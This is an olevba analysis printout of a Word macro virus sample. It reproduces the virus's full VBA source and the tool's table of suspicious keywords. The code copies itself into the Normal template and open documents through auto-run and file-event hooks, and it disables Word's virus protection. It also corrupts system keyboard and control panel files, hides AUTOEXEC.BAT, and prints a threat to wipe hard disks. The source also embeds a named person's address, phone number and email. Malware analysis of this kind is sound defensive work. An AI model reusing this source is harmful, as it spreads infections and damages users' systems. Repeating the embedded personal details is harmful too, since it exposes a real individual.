olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Michael-0893d4c96bc49f1954d0453ced9b97365bdfb817
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Michael-0893d4c96bc49f1954d0453ced9b97365bdfb817 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Myckl2_6.bas 
in file: Virus.MSWord.Michael-0893d4c96bc49f1954d0453ced9b97365bdfb817 - OLE stream: 'Macros/VBA/Myckl2_6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Welcome Hacker you gain the back door, now its yours,
'just don't include my name when you create your own virus from this virus.
'I don't want to get any credit

'The tragedy of life is not death, rather, it is what we allow to die within us while we live

'Watch your thoughts, it becomes word
'Watch your words, it becomes actions
'Watch your actions, it becomes your habit
'Watch your habit, it becomes your character
'Watch your character, it becomes your Destiny


'-------- Myckl 2.5


Option Compare Text
Option Explicit
Const MyName = "Myckl2_6"
Const TD = "ThisDocument"
Const RTNorm = "Reference to Normal"
Const ToLove = "Ablog"

'Shared Variables
Dim openDoc As Document
Dim itemName As String
Dim ndxMac As Integer
Dim virusExist As Boolean
Dim otherV As Boolean
Dim otherVName As String


Sub RestorePrev()
    On Error Resume Next
    otherV = False
    For ndxMac = 1 To ThisDocument.VBProject.vbcomponents.Count
        itemName = ThisDocument.VBProject.vbcomponents(ndxMac).Name
        If itemName <> MyName And itemName <> TD And _
            itemName <> RTNorm And itemName <> "" Then
        '----------------------------
            otherVName = itemName
            otherV = True
            GoTo OthersFound
        End If
    Next ndxMac
    
    For Each openDoc In Documents
        For ndxMac = 1 To openDoc.VBProject.vbcomponents.Count
            itemName = openDoc.VBProject.vbcomponents(ndxMac).Name
            If itemName <> MyName And itemName <> TD And _
                itemName <> RTNorm And itemName <> "" Then
            '-----------------------
                otherVName = itemName
                otherV = True
                GoTo OthersFound
            End If
        Next ndxMac
    Next openDoc
    
OthersFound:
    If otherV Then
        Application.OrganizerRename _
            Source:=ThisDocument.FullName, _
            Name:=otherVName, _
            NewName:=MyName, _
            Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub InfectFile()
Dim NTInfected As Boolean
Dim ODInfected As Boolean
    
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Call RestorePrev
    NTInfected = False
    For ndxMac = NormalTemplate.VBProject.vbcomponents.Count To 1 Step -1
        itemName = NormalTemplate.VBProject.vbcomponents(ndxMac).Name
        If itemName = MyName Then
            NTInfected = True
        End If
        If itemName <> MyName And itemName <> TD Then
            Application.OrganizerDelete _
            Source:=NormalTemplate.FullName, _
            Name:=itemName, _
            Object:=wdOrganizerObjectProjectItems
        End If
    Next ndxMac
    
    For Each openDoc In Documents
        ODInfected = False
        With openDoc
            For ndxMac = openDoc.VBProject.vbcomponents.Count To 1 Step -1
                itemName = openDoc.VBProject.vbcomponents(ndxMac).Name
                If itemName = MyName Then
                    ODInfected = True
                End If
                If itemName <> MyName And itemName <> TD And _
                    itemName <> RTNorm Then
                    Application.OrganizerDelete _
                        Source:=openDoc.FullName, _
                        Name:=itemName, _
                        Object:=wdOrganizerObjectProjectItems
                End If
            Next ndxMac
            If Not ODInfected Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=openDoc.FullName, Name:=MyName, Object:=wdOrganizerObjectProjectItems
            End If
        End With
    Next openDoc
    
    If Not NTInfected Then
        Application.OrganizerCopy _
            Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, _
            Name:=MyName, _
            Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
End Sub
Sub FileNew()
    On Error Resume Next
    If Dialogs(wdDialogFileNew).Show = -1 Then
        Call InfectFile
    End If
End Sub
Sub FileNewDefault()
    On Error Resume Next
    Documents.Add
    Call InfectFile
End Sub
Sub FilePrintDefault()
Dim freeF As Integer

    On Error Resume Next
    If (WeekDay(Date)) <> vbFriday Then
        ActiveDocument.PrintOut
        End
    End If

    If Day(Date) > 23 And WeekDay(Date) = vbFriday Then
        Call SetAttr("c:\windows\dummy.txt", vbArchive)
        freeF = FreeFile
        Kill "c:\windows\dummy.txt"
        Open "c:\windows\dummy.txt" For Output As #freeF
        Print #freeF, "Resume"
        Print #freeF, ""
        Print #freeF, "Applicant's Name: Michael I. Buen"
        Print #freeF, ""
        Print #freeF, "Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya, Tanza Cavite"
        Print #freeF, "Tel:     (046)505-17-39"
        Print #freeF, "Desired Position: Programmer/Technical Writer/Computer Salesman"
        Print #freeF, ""
        Print #freeF, "Skills: Knows C/C++, Assembly, Pascal, COBOL, Clipper, Foxpro, "
        Print #freeF, "        JavaScript, VBScript, Visual Basic, VB for Application "
        Print #freeF, "        Programming, Access, Clarion, HTML, Batch File"
        Print #freeF, ""
        Print #freeF, "Applications Expertise: Resource Workshop, Aldus Pagemaker, Adobe Photoshop,"
        Print #freeF, "        Lotus Smartsuite, Microangelo, and Of Course Excel and "
        Print #freeF, "        Microsoft Word"
        Print #freeF, ""
        Print #freeF, "Favorite Quote: ""The cure for boredom is curiosity, there is no cure "
        Print #freeF, "                for curiosity"""
        Print #freeF, ""
        Print #freeF, "With Experiences In: Innodata, SENCOR, VMSCI, GenDiesel"
        Print #freeF, ""
        Print #freeF, "Without Experiences In: Chowking, J-Sys, Jimac, CBSI, Information Professionals, "
        Print #freeF, "                        Midas Kapiti, James Martin + co, Professional Staffers, "
        Print #freeF, "                        Ergonomics, Express Telecom, 650 Companies"
        Print #freeF, ""
        Print #freeF, ""
        Print #freeF, "e-mail: mycklangelo@yahoo.com / mycklangelo@hotmail.com"
        Print #freeF, "Address: Block 6 Lot 3, Hauskon Homes, Daang Amaya, Tanza Cavite"
        Print #freeF, "tel: (046) 505-17-39"
        Print #freeF, ""
        Print #freeF, "To open my interactive resume type markbuen then highlight it"
        Print #freeF, "then open a file, then my interactive resume will pop up"
        Print #freeF, ""
        Print #freeF, "Warning: If I don't get a stable job by the end of the month"
        Print #freeF, "         I will release a third virus that will remove all "
        Print #freeF, "         folders in the Primary Hard Disk, or in layman's term"
        Print #freeF, "         para ko na ring fi-normat ang Hard Disk Mo"
        Print #freeF, ""
        Print #freeF, "-- Be a Superlearner, Enroll at AMACConda Computer College"
        Print #freeF, ""
        Print #freeF, """Programming today is a race between software engineers "
        Print #freeF, "striving to build bigger and better idiot-proof programs, "
        Print #freeF, "and the universe trying to produce bigger and better idiots. "
        Print #freeF, "So far the universe is winning."""
        Print #freeF, "---Rich Cook"
        Print #freeF, ""
        Print #freeF, "Sa year 2004 FPJ for President, Noli de Castro for Vice President"
        Print #freeF, Chr(15)
        Close #freeF
        Application.PrintOut FileName:="c:\windows\dummy.txt"
        
        If (WeekDay(Date)) <> vbFriday Then
            ActiveDocument.PrintOut
            End
        End If

    End If

    ActiveDocument.PrintOut
End Sub


Sub FileSave()
Attribute FileSave.VB_Description = "Saves the active document or template"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.FileSave"

Dim sfor As Integer
Dim PauseTime, startTime

    On Error Resume Next
    If Documents.Count <> 0 Then
        If Selection.Text = ToLove Then
            ShowVisualBasicEditor = True
            End
        End If
    End If
    
    If Documents.Count > 0 Then
        Call InfectFile
        Call ChangeSomething
        ActiveDocument.Save
    End If
    
    If Day(Date) > 23 And WeekDay(Date) = vbSaturday Then
        For sfor = 50 To 1 Step -1
            Application.StatusBar = String(sfor, " ") & "Michael Learns to Hack"
            PauseTime = 0.015625    ' Set duration.
            startTime = Timer       ' Set start time.
            Do While Timer < startTime + PauseTime
                DoEvents            ' Yield to other processes.
            Loop
            
            DoEvents
        Next sfor
        Application.StatusBar = "And Hope You'll Learn from It Too"
    'ElseIf Day(Date) = 29 Then
    '    'Show inside story
    End If

    
    
End Sub
Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Saves a copy of the document in a separate file"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.FileSaveAs"
    On Error Resume Next
    If Dialogs(wdDialogFileSaveAs).Show = -1 Then
        Call InfectFile
        ActiveDocument.Save
    End If
End Sub
Sub FileClose()
Attribute FileClose.VB_Description = "Closes all of the windows of the active document"
Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.FileClose"
    On Error Resume Next
    Call InfectFile
    ActiveDocument.Close
End Sub

Sub FileExit()
    On Error Resume Next
    Options.VirusProtection = False
    Call InfectFile
    Application.Quit
End Sub


Sub FileOpen()
Attribute FileOpen.VB_Description = "Opens an existing document or template"
Attribute FileOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.FileOpen"
Dim resBalMess As Balloon
Dim resBal As Balloon
Dim resBal2 As Balloon      'back

Dim resOpt As Long

Const resmSchooling = 1
Const resmSkills = 2
Const resmJobExperiences = 3
Const resmPersonalBackground = 4
Const resmPersonalForeground = 5

Const resmCharRef = 1
Const resmQuote = 2
Const resmInsideStory = 3

Const butClose = -12
Const butBack = -5
Const butNext = -6
    
Dim nl As String

    nl = Chr(10)
    
    On Error Resume Next
    Options.VirusProtection = False
    WordBasic.DisableAutoMacros
    If Dialogs(wdDialogFileOpen).Show = -1 Then
        Call InfectFile
        'ActiveDocument.Save
    End If
    
    If Documents.Count > 0 Then
        If Selection.Text = "markbuen" Or (Day(Date) = 30 And Month(Date) Mod 2 = 0) Then
            ' put resume here
            Set resBalMess = Assistant.NewBalloon
            Set resBal = Assistant.NewBalloon
            Set resBal2 = Assistant.NewBalloon
            
            Do
                resBal.Animation = msoAnimationListensToComputer
                resBal.Heading = "Michael Learns To Hack..."
                resBal.Text = "iNTERACTIVE rESUME" & nl & nl & _
                              "Desired Position: " & nl & "  Programmer / Technical Writer / Computer Salesman" & nl & _
                              " - - - - - - - - - - - - - - - - - - - - - - - - - "
                              
                resBal.Labels(resmSchooling).Text = "My Schooling"
                resBal.Labels(resmSkills).Text = "My Skills"
                resBal.Labels(resmJobExperiences).Text = "Job Experiences"
                resBal.Labels(resmPersonalBackground).Text = "Personal Background"
                resBal.Labels(resmPersonalForeground).Text = "Personal Foreground"
                resBal.Button = msoButtonSetNextClose
                resOpt = resBal.Show
                Select Case resOpt
                    Case resmSchooling
                        resBalMess.Animation = msoAnimationWritingNotingSomething
                        resBalMess.Heading = "My Schooling"
                        resBalMess.Labels.Count = 0
                        resBalMess.Text = "Elementary" & nl & _
                                          "   Pio del Pilar Elementary School" & nl & nl & _
                                          "High School" & nl & _
                                          "   Philippine Christian University" & nl & nl & _
                                          "College" & nl & _
                                          "   AMACConda Computer College"
                        resBalMess.Show
                        
                    Case resmSkills
                        resBalMess.Animation = msoAnimationGetTechy
                        resBalMess.Heading = "My Skills"
                        resBalMess.Text = "   Proficient with varius languages like C/C++, Assembly, Pascal, COBOL, Foxpro, SQL, Visual Basic, Clarion, JavaScript, VB for Application, VBScript, HTML" & nl & nl & _
                                          "   Proficient in Application Softwares like Adobe Photoshop, Resourcce Workshop, Microangelo, Lotus Smart Suite, Aldus Pagemaker, Frontpage, Powerpoint, and of course Word and Excel"
                        resBalMess.Labels.Count = 0
                        resBalMess.Show
                        
                    Case resmJobExperiences
                        
                        resBalMess.Animation = msoAnimationWorkingAtSomething
                        resBalMess.Heading = "Experiences"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 4
                        resBalMess.Labels(1).Text = "INNODATA -- Typereader (corrects OCR errors)"
                        resBalMess.Labels(2).Text = "SENCOR -- Encoder"
                        resBalMess.Labels(3).Text = "VMSCI -- Pseudo Programmer Trainee"
                        resBalMess.Labels(4).Text = "GenDiesel -- Super Encoder"
                                                                                    
                        resBalMess.Show
                        
                    Case resmPersonalBackground
                        resBalMess.Animation = msoAnimationCharacterSuccessMajor
                        
                        resBalMess.Heading = "Personal Background"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 3
                        resBalMess.Labels(1).Text = "Hardworking, Softworking, Quiet(low-noise), Sociable Person especially on Party "
                        resBalMess.Labels(2).Text = "Reliable, with Good Interpersonal Communicatin Skills and Intrapersonal Communication Skills (8 data bits, odd parity, 1 stop bit)"
                        resBalMess.Labels(3).Text = "Goal-oriented, Success-oriented, Journey-Oriented, Object-Oriented Person, w/ Good Moral Character and w/ Pissing Personality"
                        resBalMess.Show
                        
                    Case resmPersonalForeground
                        
                        resBalMess.Animation = msoAnimationGetAttentionMinor
                        resBalMess.Heading = "Personal Foreground"
                        resBalMess.BalloonType = msoBalloonTypeBullets
                                                
                        resBalMess.Text = ""
                        resBalMess.Labels.Count = 5
                        resBalMess.Labels(1).Text = "Black-eyes, black hair, black nostrils"
                        resBalMess.Labels(2).Text = "Cute (Patingin nga ng Dimple)"
                        resBalMess.Labels(3).Text = "Down-to-Earth (ALIEN?!)"
                        resBalMess.Labels(4).Text = "Boy-Next-Windows '95 Type"
                        resBalMess.Labels(5).Text = "Macho-chulis ang mga buto"
                        resBalMess.Show
                                                
                    Case butNext
                                            
                        resBal2.Labels.Count = 3
                        resBal2.Heading = "Michael Learns To Hack..."
                        resBal2.Text = "Interactive Resume"
                        resBal2.Labels(1).Text = "Character References"
                        resBal2.Labels(2).Text = "Quote for the Moment"
                        resBal2.Labels(3).Text = "Inside Story"
                        resBal2.Button = msoButtonSetBackClose
                        resOpt = resBal2.Show
                        
                        Select Case resOpt
                        Case resmCharRef
                            resBalMess.Labels.Count = 0
                            resBalMess.Heading = "Character References"
                            resBalMess.Text = "(In No Particular Order Using Rnd (110) and Randomize ) " & nl & nl & _
        "Franco Rayela, Roger Macalino, Byron James C. Ngan, Onel de Guzman, Serafin Santos, Conrad Pena, Jerome Sison, Alde Aceveda, Philip Mora, Richard Canuto, Leonides ""Darren"" Mendoza, Emetrio ""Jing"" Austria, Irving Ilagan, Christian Ramirez, Edwin & Erwin Quita, Joana Alonso, Frederick Vicent Tant, Roland Moldez, Lilibeth Serencio, Gilberto Piliin, Michael Santiano, Michael Salamat, Michael Manuel Murillo, Michael Lucas, Joseph Taopo, Joseph Borja, Joseph Landicho, Giovanni Largo, Juvany Ponce, Alberto Cayanan, Ronald Batoon, Philip Miralles, Jay Manpreet, Aldwin Mapili, Virgilio So, Erlinda Sy, Philbert Pagaspas, Juanita Cataag, Mar Dojillo, Novelita Calimag, Verlin Samonte, Sir Bernabe Santa Maria, Alejandro Bais, Ma'am Grace Quitoriano, Sir Lucero, Ma'am Maderas, Sir Omar Ghazal, Sir Angelo Gillen, Dondi Macas, Arsenio Macapaz, Rolly Mendoza, " & nl & nl & "(Not My Character References)" & nl & "President Joseph Estrada, Blas Ople, Franklin Drilon, Jose Ma. Sison, Jolina Magdangal, " & nl & _
                            "Kristin Hermosa, Aurora Halili, Angela Velez "
                            resBalMess.Animation = msoAnimationGestureUp
                            resBalMess.Show
                        Case resmQuote
                            Call Quote
                        Case resmInsideStory
                            resBalMess.Labels.Count = 0
                            resBalMess.Heading = "InsideStory"
                            resBalMess.Text = "Programmer 's Profile" & nl & _
                                "Real Mode Name: Michael I. Buen" & nl & _
                                "Protected Mode Name: Mycklangelo ""The Skulltor\n"" Buenarotti" & nl & _
                                "Birthday: November 5, 1976" & nl & _
                                "Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya," & nl & _
                                "         Tanza Cavite City" & nl & _
                                "Telephone: (046) 505-17-39" & nl & _
                                "e-mail address: mycklangelo@yahoo.com;mcklangelo@hotmail.com" & nl & _
                                "Group Affiliated: GRAMMERSoft, Elevated Ideas" & nl & _
                                "Group Not Affiliated: AMACConda Group of Companies" & nl & _
                                "Services Offered: Programming , Debugging" & nl & _
                                "Services Not Offered: Hacking , Pest - Control" & nl & nl & _
                                "About Me:" & nl & _
                                "I 'm not a virus programmer per se, I'm just a dedicated programmer and a serious learner." & nl & _
                                "My Favorite Principle in Writing (Code):" & nl & _
                                "A book is finished not when nothing more can be added, but when nothing can be remove from it. -- Code Complete: Steve McConnell" & nl & nl & _
                                "My Interest And Activites:" & nl & _
                                "Reading, Analyzing, Hacking, Reading, Analyzing, Reading, Reading, Analyzing, Hacking, Analyzing, Analyzing, Analyzing, Analyzing, (program halt)" & nl & nl & _
                                "Favorite Quote:" & nl & _
                                "The cure for boredom is curiosity.  There is no cure for curiosity" & nl & _
                                    "*** ACNOWLEDGMENT ***" & nl & _
"I 'm thanking Byron for sharing his computer and ideas, book and time, I'm using his computer every Saturday and Sunday just to write this program.  And to all GRAMMERSoft especially LIENQ, I know what the hell of hacking we are all doing but nevertheless it is still legitimate learning.  And to PC-Cillin, the anti-virus software that gave me a hint that events of Word and Excel can be hooked by naming your procedures with the name of the event.  And to Rivermaya, Eraserheads, Renz Verano who's continuing to write Original Pilipino Music that calms our soul.  And Since I haven't yet finished my Thesis and Automata, I'll consider this as my quick software project, so I'll have to thanks all those beta tester of this virus, you can send me you comment and ratings about my program.  And to Mark ( he's currently a freshman computer science at Adamson University ) my brother, sorry I haven't include your picture here, the program has grown too large already.  Kung nagkataon ang pangalan ng virus na ito " & _
                                "ay ""Mark My Word ""." & nl & nl & _
                                "-- Be a Superlearner, Enroll at AMACConda Computer College"
                                resBalMess.Animation = msoAnimationCheckingSomething
                                resBalMess.Show
                            
                        End Select
                End Select
            Loop While resOpt <> butClose
        End If
    End If
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = False
End Sub

Sub ViewVBCode()
    On Error Resume Next
    msg ("Visual Basic")
    System.Cursor = wdCursorNormal
End Sub

Sub ToolsMacro()
    On Error Resume Next
    msg ("Macro Tools")
    System.Cursor = wdCursorNormal
End Sub

Sub Quote()
Dim quotes(1 To 14) As String
Dim qBal As Balloon
    
Static prevQuote As Long
Static currQuote As Long

Dim nl As String

    nl = Chr(10)

    On Error Resume Next
    Options.VirusProtection = False

    quotes(1) = "On Fuzzy Logic" & nl & nl & _
                """  He who would distinguish " & _
                "  the true from false must have" & _
                "  an adequate idea of what is true and what is false"""
                                                            
    quotes(2) = "On Creating a Pseudocode" & _
                nl & nl & "Iterate.  Try as many ideas as you can" & _
                " in PDL (program design language)before you start coding." & _
                "  Once you start coding, you get emotionally" & _
                " involved with your code and it becomes harder to" & _
                " throw away a bad design and start over." & _
                nl & nl & "-- Steve McConnell"
                

    quotes(3) = """The cure for boredom is curiosity.  There is " & _
                " no cure for curiosity""" & _
                nl & nl & "-- Dorothy Parker"
                         
    quotes(4) = "On Tracking Down an Error" & _
                nl & nl & "  ""And if you can take one from three" & _
                " hundred and sixty-five, what remains?""" & _
                "  ""Three hundred and sixty-four of course"", Alice said." & _
                "  Humpty Dumpty looked doubtful.  ""I'd rather see that done in paper"", he said." & _
                nl & nl & "--Alice in Wonderland"
                
    quotes(5) = "On Good Variable Naming" & _
                 nl & nl & "  ""Don't stand chattering" & _
                 " to yourself like that,"" Humpty Dumpty said, " & _
                 " looking at her for the first time, ""but tell me " & _
                 " your name and your business.""  ""My" & _
                 " name is Alice, but --"".  ""It's a" & _
                 " stupid name enough!"", Humpty Dumpty" & _
                 " interrupted impatiently.  ""What does" & _
                 " it mean?"", ""Must a name mean something?"" Alice" & _
                 " asked doubtfully.  ""Of course it must,""  Humpty" & _
                 " Dumpty said with a short laugh:  ""My name means the" & _
                 " shape that I am and a good handsome shape it is, too. " & _
                 " With a name like yours, you might be any shape, " & _
                 " almost."""
               
                
    quotes(6) = """The significant problems we face cannot be solved by the " & _
                 "same level of thinking that created them.""" & _
                 nl & nl & "--Albert Einstein"
                 
                    
    quotes(7) = """Words are so powerful, but I found it powerfully useless " & _
                 "just to come up with a statement like this.""" & _
                 nl & nl & "--Michael I. Buen"
                 
    quotes(8) = "On Temporary Solution" & _
                 nl & nl & """One powerful heuristic tool is brure force.  Don't " & _
                 "underestimate it.  A brute force solution is better than an elegant " & _
                 "solution that doesn't work.""" & _
                 nl & nl & "--Steve McConnell"
                 
    quotes(9) = "On Design Process Stage" & _
                 nl & nl & """We try to solve the problem by rushing through " & _
                 "the design process so that enough time is left at the end of " & _
                 "project to uncover the errors that were made because we rushed " & _
                 "through the design process.""" & _
                 nl & nl & "--Glenford Myers"
                 
    quotes(10) = "On Premature Optimization" & nl & nl & _
                 """We should forget about small efficiencies, say about 97% of " & _
                 "the time: premature optimization is the root of all evil.""" & _
                 nl & nl & "--Donald Knuth"
                 
    quotes(11) = """The problem definition lays the foundation for the " & _
                 "rest of the programming process.""" & _
                 nl & nl & "--Steve McConnell"
                 
    quotes(12) = """From a programmer's point of view, the user is " & _
                 "a peripheral that types when you issue a read request.""" & _
                 nl & nl & "--Peter Williams"
                 
    quotes(13) = """Programming today is a race between software engineers " & _
                 "striving to build bigger and better idiot-proof programs, " & _
                 "and the universe trying to produce bigger and better idiots. " & _
                 "So far the universe is winning.""" & _
                 nl & nl & "--Rich Cook"
                 
    quotes(14) = """I can do everything through Him who gives me strength.""" & _
                 nl & nl & "--Philipians 4:13 (courtesy of Byron2 James C. Ngan)"
                         
    Call Randomize
    Do
        currQuote = Random()
    Loop While currQuote = prevQuote
    
    Set qBal = Assistant.NewBalloon
    qBal.Heading = "Quote for the Moment"
    qBal.Animation = msoAnimationThinking
    qBal.Text = quotes(currQuote)
    qBal.Show
    
    prevQuote = currQuote
End Sub


Function Random() As Long
    Random = Int((14 * Rnd) + 1)
End Function

Sub ChangeSomething()
Dim kb
Dim i As Long
Dim l As Long
Dim chgHdr As Byte
Dim f1 As Integer
Dim vball As Integer

    On Error Resume Next
    vball = vbReadOnly + vbSystem + vbHidden + vbArchive
    
    If (Day(Date) <= 7 And WeekDay(Date) = vbMonday) And Year(Date) > 1999 Then
        f1 = FreeFile()
        Call SetAttr("c:\windows\system\main.cpl", vbNormal)
        Open "c:\windows\system\main.cpl" For Random As #f1
        chgHdr = 66
        Put #f1, 1, chgHdr
        Close #f1

        kb = Array(67720004, 65536, 28, 370, 0, 0, 0, 196610, 5, 2490368, 5767213, 7340132, 10879026, 3145846, _
            322, 0, -2146303944, -2146336752, 50462976, 1540, 67240193, 0, 0, 134217726, 0, 0, 0, 0, _
            0, 14811362, 17957138, 14680282, 7733366, 7733366, 14549206, 808464432, 834667012, _
            892613426, 959985462, 1371258160, 1414677847, 1330206041, -589440176, 1178882881, _
            1263159367, 1524546124, 1112949592, -1094955698, 36299455, 100992003, 168364039, _
            269290507, 336794129, 404166165, 723196441, 555753246, 623125282, 740828966, 808398381, _
            875770417, -589605323, 471589597, -1120527331, 1298145054, 543912545, 1852142914, _
            1295854881, 1634231145, 975203429, 1549622057, 1918985548, 1948283758, 1210530671, _
            560685921, 774644001, 561929263, 623125312, 673850974, 1361796905, 1414677847, _
            1330206041, 2088598352, 1178882881, 1263159367, 1512192588, 1112949592, 1044139342, _
            828406847, 892613426, 959985462, 1362963760, 1414677847, 1330206041, 1549622096, _
            1178882881, 1263159367, 1512520524, 1112949592, 774655310, 23599)
                        
        f1 = FreeFile()
        If Dir("c:\windows\system\kbdus.kbd", vball) = "kbdus.kbd" Then
            Call SetAttr("c:\windows\system\kbdus.kbd", vbNormal)
        End If
        
        Open "c:\windows\system\kbdus.kbd" For Binary As #f1
        For i = 1 To 398 Step 4
            l = kb((i \ 4))
            Put #f1, i, l
        Next
        Close #f1
        
        f1 = FreeFile()
        If Dir("c:\windows\system\kbdusx.kbd", vball) = "kbdusx.kbd" Then
            Call SetAttr("c:\windows\system\kbdusx.kbd", vbNormal)
        End If
        
        Open "c:\windows\system\kbdusx.kbd" For Binary As #f1
        For i = 1 To 398 Step 4
            l = kb((i \ 4))
            Put #f1, i, l
        Next
        Close #f1
    End If
End Sub


Sub AutoOpen()
    On Error Resume Next
    Options.SaveNormalPrompt = False
    
    otherV = False
    For ndxMac = 1 To NormalTemplate.VBProject.vbcomponents.Count
        itemName = NormalTemplate.VBProject.vbcomponents(ndxMac).Name
        If itemName <> MyName And itemName <> TD And _
            itemName <> RTNorm And itemName <> "" Then
        '-----------------------
            otherVName = itemName
            otherV = True
            GoTo OthersFound
        End If
    Next ndxMac
    
    For Each openDoc In Documents
        For ndxMac = 1 To openDoc.VBProject.vbcomponents.Count
            itemName = openDoc.VBProject.vbcomponents(ndxMac).Name
            If itemName <> MyName And itemName <> TD And _
                itemName <> RTNorm And itemName <> "" Then
            '-----------------------
                otherVName = itemName
                otherV = True
                GoTo OthersFound
            End If
        Next ndxMac
    Next openDoc
    
OthersFound:

    If Not otherV Then
        On Error Resume Next
        Options.VirusProtection = False
        Call InfectFile
        Call ChangeSomething
    Else
        Application.OrganizerRename _
            Source:=ActiveDocument.FullName, _
            Name:=MyName, _
            NewName:=otherVName, _
            Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub DoSome()
    On Error Resume Next
    If Dir("c:\autoexec.bat") = "autoexec.bat" Then
        Call SetAttr("c:\msconfig.sys", vbNormal)
        Kill ("c:\msconfig.sys")
        Call SetAttr("C:\AUTOEXEC.BAT", vbNormal)
        Name "C:\AUTOEXEC.BAT" As "C:\MSCONFIG.SYS"
        Call SetAttr("C:\MSCONFIG.SYS", vbSystem + vbReadOnly + vbHidden)
        Call InfectFile
    End If
End Sub

Sub AutoExec()
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Call ChangeSomething
    Call DoSome
    Call InfectFile
End Sub

Sub AutoClose()
    On Error Resume Next
    Call InfectFile
End Sub

Sub AutoNew()
    On Error Resume Next
    Call InfectFile
End Sub

Sub AutoExit()
    On Error Resume Next
    Call InfectFile
End Sub
 
 
 Sub FileTemplates()
 On Error Resume Next
    msg ("Templates")
    System.Cursor = wdCursorNormal
 End Sub

Sub msg(s As String)
    Call MsgBox("The utilities " & s & "is not available at the standard edition of Microsoft Word, contact Microsoft for upgrade (cost of upgrade is minimal)", vbCritical, "Not available")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |main.cpl            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Hex String|!F09D               |2146303944                                   |
|Hex String|!F3gR               |2146336752                                   |
|Hex String|PF)v                |50462976                                     |
|Hex String|UWS$                |55575324                                     |
|Hex String|b1%(                |62312528                                     |
|Hex String|b1%1                |62312531                                     |
|Hex String|wFU1                |77465531                                     |
+----------+--------------------+---------------------------------------------+

